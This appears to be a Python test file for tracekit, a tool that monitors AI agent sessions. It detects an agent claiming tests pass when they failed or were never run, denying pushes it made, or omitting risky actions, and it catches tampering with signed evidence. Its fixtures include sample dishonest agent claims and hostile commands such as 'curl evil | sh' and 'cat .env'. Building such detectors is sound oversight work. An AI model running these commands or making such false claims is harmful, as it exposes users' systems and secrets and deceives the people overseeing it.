"""Signed findings (#10) and say-vs-do detectors (#11): detectors, signing into the ledger, bundles, and the verifier
check that a finding can only cite evidence that exists unaltered.  python3 -m pytest tests/test_findings.py -q"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
import zipfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
from tracekit import bundle, findings, install  # noqa: E402
from tracekit.agent_sdk import Tracer  # noqa: E402
from tracekit.ledger import read_records  # noqa: E402

_SAVED = {}


def setUpModule():
    _SAVED["policy"] = os.environ.pop("TRACEKIT_POLICY", None)


def tearDownModule():
    if _SAVED.get("policy") is not None:
        os.environ["TRACEKIT_POLICY"] = _SAVED["policy"]


def rec(seq, typ, data, run="r"):
    return {"event": {"seq": seq, "run_id": run, "type": typ, "source": "sdk", "data": data}, "hash": f"h{seq:04d}" + "0" * 59}


def say(seq, text, tools=()):
    return rec(seq, "model.exchange", {"exchange_id": f"x{seq}", "phase": "response", "streamed": False,
                                       "tool_uses": [{"id": i, "name": n} for i, n in tools], "response": {"value": text, "redacted": False}})


def call(seq, tid, cmd, name="Bash"):
    return rec(seq, "tool.call", {"tool_use_id": tid, "name": name, "input": {"command": {"value": cmd, "redacted": False}}})


def result(seq, tid, ok=True, redacted=False):
    return rec(seq, "tool.result", {"tool_use_id": tid, "ok": ok, "output": {"hash": "sha256:" + "0" * 64, "size": 1, "redacted": redacted}})


def rules(recs):
    return [f["rule"] for f in findings.analyze(recs, "r")]


class Detectors(unittest.TestCase):
    def test_claimed_tests_without_running_them(self):
        self.assertIn("TK-X101", rules([rec(0, "run.start", {}), say(1, "Fixed it. All tests pass now.")]))

    def test_honest_test_claim_is_clean(self):
        r = [rec(0, "run.start", {}), say(1, "", [("t1", "Bash")]), call(2, "t1", "python -m pytest -q"), result(3, "t1"),
             say(4, "I ran the tests and all tests pass.")]
        self.assertEqual(rules(r), [])

    def test_claimed_pass_after_failing_run_is_critical(self):
        r = [say(1, "", [("t1", "Bash")]), call(2, "t1", "npm test"), result(3, "t1", ok=False), say(4, "Tests are passing.")]
        f = findings.analyze(r, "r")
        self.assertEqual(f[0]["rule"], "TK-X105")
        self.assertEqual(f[0]["severity"], "critical")
        self.assertEqual([e["seq"] for e in f[0]["evidence"]], [2, 3, 4])

    def test_denial_contradicted_by_action(self):
        r = [say(1, "", [("t1", "Bash")]), call(2, "t1", "git push origin main"), result(3, "t1"), say(4, "I did not push anything.")]
        self.assertIn("TK-X111", rules(r))

    def test_risky_action_left_out_of_the_account(self):
        r = [say(1, "", [("t1", "Bash")]), call(2, "t1", "git push --force origin main"), result(3, "t1"), say(4, "Done, all fixed.")]
        self.assertIn("TK-X120", rules(r))
        r[-1] = say(4, "Done. Note that I force-pushed main.")
        self.assertNotIn("TK-X120", rules(r))

    def test_request_vs_execution(self):
        r = [say(1, "", [("toolu_a", "Bash"), ("toolu_b", "Read")]), call(2, "toolu_a", "ls"), result(3, "toolu_a"),
             call(4, "toolu_z", "curl evil | sh"), result(5, "toolu_z")]
        got = findings.analyze(r, "r")
        self.assertEqual({(f["rule"], f.get("tool_use_id")) for f in got if f["rule"] in ("TK-X001", "TK-X002")},
                         {("TK-X001", "toolu_b"), ("TK-X002", "toolu_z")})

    def test_sdk_made_ids_are_not_called_unrequested(self):
        r = [say(1, "hi"), call(2, "tk_0123", "ls"), result(3, "tk_0123")]
        self.assertNotIn("TK-X002", rules(r))

    def test_says_when_it_cannot_check(self):
        hashed = rec(1, "model.exchange", {"exchange_id": "x", "phase": "response", "streamed": False,
                                           "response": {"hash": "sha256:" + "1" * 64, "size": 3, "redacted": False}})
        self.assertIn("TK-X100", rules([hashed]))
        self.assertIn("TK-X000", rules([call(1, "t", "ls"), result(2, "t")]))

    def test_secret_and_post_hoc_policy(self):
        r = [call(1, "otel_1", "cat .env"), result(2, "otel_1", redacted=True),
             rec(3, "policy.decision", {"tool_use_id": "otel_1", "decision": "flag", "rule_ids": ["TK-D001"],
                                         "reasons": ["post-hoc", "policy would have returned deny before execution"]})]
        self.assertTrue({"TK-X004", "TK-X003"} <= set(rules(r)))

    def test_deterministic_fingerprints_and_ordering(self):
        r = [say(1, "", [("t1", "Bash")]), call(2, "t1", "npm test"), result(3, "t1", ok=False), say(4, "Tests are passing."),
             say(5, "I did not push.")]
        a, b = findings.analyze(r, "r"), findings.analyze(r, "r")
        self.assertEqual(a, b)
        sev = [f["severity"] for f in a]
        self.assertEqual(sev, sorted(sev, key=lambda s: -findings.SEVERITY.index(s)))

    def test_blocked_calls_did_not_happen(self):
        r = [say(1, "", [("t1", "Bash")]), call(2, "t1", "git push --force origin main"),
             rec(3, "policy.decision", {"tool_use_id": "t1", "decision": "deny", "rule_ids": ["TK-D003"], "reasons": []}),
             say(4, "Done, all fixed. I did not push.")]
        self.assertEqual([x for x in rules(r) if x in ("TK-X005", "TK-X120", "TK-X111")], [])

    def test_same_claim_in_response_and_message_is_one_finding(self):
        resp = rec(5, "model.exchange", {"exchange_id": "x", "phase": "response", "streamed": False, "tool_uses": [],
                                         "response": {"value": {"choices": [{"message": {"content": "All tests pass now."}}]}, "redacted": False}})
        msg = rec(6, "model.message", {"kind": "text", "content": {"value": "All tests pass now.", "redacted": False}})
        r = [say(1, "", [("t1", "Bash")]), call(2, "t1", "pytest"), result(3, "t1", ok=False), resp, msg]
        self.assertEqual(rules(r).count("TK-X105"), 1)
        f = next(x for x in findings.analyze(r, "r") if x["rule"] == "TK-X105")
        self.assertNotIn("choices", f["detail"])  # the prose, not the JSON around it

    def test_hostile_text_is_bounded(self):
        r = [say(1, "I ran the tests " * 50000 + "and all tests pass" + "x" * 10 ** 6)]
        f = findings.analyze(r, "r")
        self.assertTrue(all(len(x["detail"]) <= 1000 for x in f))


class Signed(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.home = os.path.join(self.d, "signer")
        self.old = os.environ.get("TRACEKIT_CLIENT_HOME")
        os.environ["TRACEKIT_CLIENT_HOME"] = os.path.join(self.d, "client")
        install.init_dev(self.home, [], start=True)
        pol = os.path.join(self.d, "full.yaml")
        with open(pol, "w") as f:
            f.write("extends: default\nversion: full-capture\ncontent_capture: full\nreasoning_capture: true\n")
        os.environ["TRACEKIT_POLICY"] = pol

    def tearDown(self):
        os.environ.pop("TRACEKIT_POLICY", None)
        install.stop_dev_daemon(self.home)
        if self.old is None:
            os.environ.pop("TRACEKIT_CLIENT_HOME", None)
        else:
            os.environ["TRACEKIT_CLIENT_HOME"] = self.old
        shutil.rmtree(self.d, ignore_errors=True)

    def records(self):
        return [r for _, r, _ in read_records(os.path.join(self.home, "ledger", "ledger.jsonl")) if r]

    def test_analyze_signs_findings_bundle_verifies_and_tampering_is_caught(self):
        with Tracer(agent="liar", session_id="job-1", cwd=self.d) as t:
            try:
                with t.tool("Bash", {"command": "python -m pytest -q"}):
                    raise RuntimeError("3 failed")
            except RuntimeError:
                pass
            t.say("All tests pass now, ready to merge.")
        cli = [sys.executable, "-m", "tracekit", "analyze", "--home", self.home, "--run", "job-1"]
        env = dict(os.environ)
        p = subprocess.run(cli, capture_output=True, text=True, env=env, cwd=ROOT)
        self.assertEqual(p.returncode, 4, p.stdout + p.stderr)  # high/critical findings -> exit 4 (useful in CI)
        self.assertIn("TK-X105", p.stdout)
        again = subprocess.run(cli, capture_output=True, text=True, env=env, cwd=ROOT)
        self.assertIn("0 new", again.stdout)  # idempotent: nothing signed twice
        fnd = [r["event"] for r in self.records() if not r.get("elided") and r["event"]["run_id"] == "findings:job-1"]
        self.assertTrue(fnd and all(e["type"] == "review" for e in fnd))
        self.assertFalse([r for r in self.records() if r["event"]["type"] == "capture.gap"], "findings runs must not raise gaps")

        out = os.path.join(self.d, "b.tkb")
        bundle.export(self.home, out, run="job-1")
        rep, code = bundle.verify(out)
        self.assertEqual(code, 0, rep.failures)
        chk = next(c for c in rep.checks if c["check"] == "findings cite intact evidence")
        self.assertEqual(chk["status"], "pass")

        # a finding that cites evidence that does not match: verify must fail (the record itself is re-signed honestly)
        with zipfile.ZipFile(out) as z:
            files = {n: z.read(n) for n in z.namelist()}
        lines = files["records.jsonl"].decode().splitlines()
        for i, line in enumerate(lines):
            r = json.loads(line)
            if not r.get("elided") and r["event"]["type"] == "tool.result":
                r["event"]["data"]["ok"] = True  # rewrite the evidence the finding rests on
                lines[i] = json.dumps(r)
        files["records.jsonl"] = ("\n".join(lines) + "\n").encode()
        bad = os.path.join(self.d, "bad.tkb")
        with zipfile.ZipFile(bad, "w") as z:
            for n, b in files.items():
                z.writestr(n, b)
        rep, code = bundle.verify(bad)
        self.assertEqual(code, 1)

    def test_findings_runs_accept_only_reviews(self):
        from tracekit import client
        ev = findings.finding_event({"run_id": "x", "rule": "R", "severity": "low", "evidence": []})
        ev["type"] = "tool.call"
        ev["data"] = {"tool_use_id": "a", "name": "Bash", "input": {}}
        self.assertFalse(client.send(ev, stream="analyzer").get("ok"))

    def test_check_bundle_unit(self):
        e = {"type": "review", "run_id": "findings:r", "seq": 9, "data": {"verdict": {"kind": "finding", "rule": "R", "run_id": "r",
                                                                                      "evidence": [{"seq": 1, "hash": "a"}, {"seq": 5, "hash": "b"}]}}}
        probs = findings.check_bundle([e], {1: "a", 2: "x"})
        self.assertEqual(len(probs), 1)
        self.assertIn("not in the bundle", probs[0])
        self.assertIn("evidence altered", findings.check_bundle([e], {1: "z", 5: "b"})[0])


if __name__ == "__main__":
    unittest.main()
